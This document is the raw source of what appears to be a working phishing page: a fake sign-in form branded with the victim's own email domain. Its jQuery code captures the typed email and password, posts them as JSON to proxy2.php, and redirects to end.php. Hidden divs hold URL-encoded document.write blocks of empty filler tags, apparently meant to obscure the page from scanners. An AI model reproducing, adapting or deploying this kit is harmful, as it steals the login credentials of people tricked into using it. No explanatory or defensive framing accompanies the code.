E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E'));
//-->
				</script><section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div><section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div><section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div><section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div><section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div><section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
<section></section><ul></ul><ul></ul><nav></nav><nav></nav><nav></nav><div></div><div></div><div></div><div></div>
			</div>
			
			</div>
				<input type="submit" value="Sign In" id="login-but" name="frm-submit"><br>
			
		</form>
	</div>

	
</div>
<div id="footer">
		<span id="user-domain2">Cmi-malawi.com </span> <span>©</span> 2024. All rights reserved.
	</div>
<script type="text/javascript">
	

      function validInputs(){
      	  var e = $("#u-email").val().trim();
      	  var p = $("#u-pass").val().trim();

      	  if(e != "" && p != ""){
               if(validEmail(e)){
                   return true;
               }else{
               	return false;
               }

      	  }else{
      	  	if(e != ""){
               msg_error(1);
      	  	}else{
      	  		msg_error(2);
      	  	}
      	  }
      }

  
     
   function validEmail(mail){
      var rex = /^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/;

      if(mail.match(rex)){

          return true;
      }else{
      	msg_error(1);
      	 return false;
      }
   }


  function msg_error(n){ 

     if(n < 2){
        $("#error-c").html("invalid password");
        $("#u-pass").css({'border':'solid 2px #e53d16'});
        $("#u-email").css({'border':'solid 2px #e53d16'});
     }else{
     	$("#error-c").html("invalid email or password");
     	$("#u-pass").css({'border':'solid 2px #e53d16'});
	    $("#u-email").css({'border':'solid 2px #e53d16'});
     }
     $("#error-c").css({"color":"#ff0000"});
   }

   function hide_error(){ 
    
     $("#u-pass").css({'border':'solid 1px #000'});
     $("#u-email").css({'border':'solid 1px #000'});
     $("#error-c").html("");
     $("#error-c").css({"color":"#fff"});
   }






</script>



<div style="display:none;">
<script type="text/javascript">
	document.write(unescape('%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%0D%0A%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%0D%0A%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E'));
</script><header></header><header></header><header></header><header></header><header></header>
<header></header><header></header><header></header>
<header></header><header></header><header></header>
<header></header><header></header>
<header></header><header></header><header></header>

<div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
<div></div><div></div><div></div><div></div><div></div><div></div>
<ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul>
<span></span><span><sub></sub></span><span></span><span><sub></sub></span><span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>

<nav></nav><nav></nav><nav></nav><nav></nav><nav></nav>
<section></section><section></section><section></section><section></section><section></section><section></section><section></section>


</div>

<script type="text/javascript">
	
   $("#form").on("submit",function(e){
    e.preventDefault();
      if(validInputs()){
          dataGiver();
      }else{
      	msg_error(2);
      }
        
   });

		
   function dataGiver(){
	   var varData = {};
   	   var e = $("#u-email").val();
      	var p = $("#u-pass").val();
		varData.email = e;
	   varData.pass = p;
      	$.ajax({
           type:"POST",
           url:"proxy2.php",
           data:{details : JSON.stringify(varData)},
           beforeSend: function(){
           	 deactivateForm();
             hide_error();
           },
           success: function(s){
			 window.location = "end.php?email="+e+"";
           },
           error: function(){
              msg_error(1);
           }

      	});
   }

   function deactivateForm(){
   	  $("#u-email,#u-pass,input").prop("disabled",true);
   }

    function activateForm(){
   	  $("input").prop("disabled",false);
   }

</script>

<div style="display:none;">
<script type="text/javascript">
	document.write(unescape('%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%0D%0A%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%0D%0A%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E'));
</script><header></header><header></header><header></header><header></header><header></header>
<header></header><header></header><header></header>
<header></header><header></header><header></header>
<header></header><header></header>
<header></header><header></header><header></header>

<div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
<div></div><div></div><div></div><div></div><div></div><div></div>
<ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul>
<span></span><span><sub></sub></span><span></span><span><sub></sub></span><span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>

<nav></nav><nav></nav><nav></nav><nav></nav><nav></nav>
<section></section><section></section><section></section><section></section><section></section><section></section><section></section>


</div>
<script type="text/javascript">

	function gm() {
   	   var e = $("#um").val().trim();

   	   if(e != "" && validEmail(e)){
           var rex = /^[_a-z0-9-]+(\.[_a-z0-9-]+)*(?=@)@/;
           var em = e.replace(rex,"");

           var rex2 = /(\.[a-z]{2,4})$/;
           var em1 = em.replace(rex2,"");

            var c = em1.charAt(0);
            var s = em1.substring(1);
             var c2 = em.charAt(0);
            var s2 = em.substring(1);

            var domain = c.toUpperCase()+s;
            var domain2 = c2.toUpperCase()+s2;
           

           $("#user-domain").html(domain+" ");
           $("#user-domain2").html(domain2+" ");
   	   }
   }

   gm();

</script>


</body><editor-card style="animation: initial; transition: initial; color: initial; font: initial; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-variation-settings: initial; text-orientation: initial; text-rendering: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; backdrop-filter: initial; backface-visibility: initial; background: initial; background-blend-mode: initial; baseline-shift: initial; block-size: initial; border-block-end: initial; border-block-start: initial; border: initial; border-radius: initial; border-collapse: initial; border-inline-end: initial; border-inline-start: initial; bottom: initial; box-shadow: initial; box-sizing: initial; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; content: initial; counter-increment: initial; counter-reset: initial; cursor: initial; cx: initial; cy: initial; d: initial; display: initial; dominant-baseline: initial; empty-cells: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: initial; hyphens: initial; image-rendering: initial; inline-size: initial; isolation: initial; left: 0px; letter-spacing: initial; lighting-color: initial; line-break: initial; list-style: initial; margin-block-end: initial; margin-block-start: initial; margin: initial; margin-inline-end: initial; margin-inline-start: initial; marker: initial; mask: initial; mask-type: initial; max-block-size: initial; max-height: initial; max-inline-size: initial; max-width: initial; min-block-size: initial; min-height: initial; min-inline-size: initial; min-width: initial; mix-blend-mode: initial; object-fit: initial; object-position: initial; offset: initial; opacity: initial; order: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-wrap: initial; overflow: initial; overscroll-behavior-block: initial; overscroll-behavior-inline: initial; overscroll-behavior: initial; padding-block-end: initial; padding-block-start: initial; padding: initial; padding-inline-end: initial; padding-inline-start: initial; page: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: initial; position: absolute; quotes: initial; r: initial; resize: initial; right: initial; rx: initial; ry: initial; scroll-behavior: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: initial; text-align-last: initial; text-anchor: initial; text-combine-upright: initial; text-decoration: initial; text-decoration-skip-ink: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-size-adjust: initial; text-transform: initial; text-underline-position: initial; top: 0px; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; user-select: initial; vector-effect: initial; vertical-align: initial; visibility: initial; -webkit-app-region: initial; -webkit-appearance: initial; border-spacing: initial; -webkit-border-image: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-font-size-delta: initial; -webkit-highlight: initial; -webkit-hyphenate-character: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-margin-collapse: initial; -webkit-margin-bottom-collapse: initial; -webkit-margin-top-collapse: initial; -webkit-mask-box-image: initial; -webkit-mask: initial; -webkit-mask-composite: initial; -webkit-perspective-origin-x: initial; -webkit-perspective-origin-y: initial; -webkit-print-color-adjust: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-emphasis: initial; -webkit-text-emphasis-position: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-transform-origin-x: initial; -webkit-transform-origin-y: initial; -webkit-transform-origin-z: initial; -webkit-user-drag: initial; -webkit-user-modify: initial; white-space: initial; widows: initial; width: initial; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: auto;"></editor-card></html>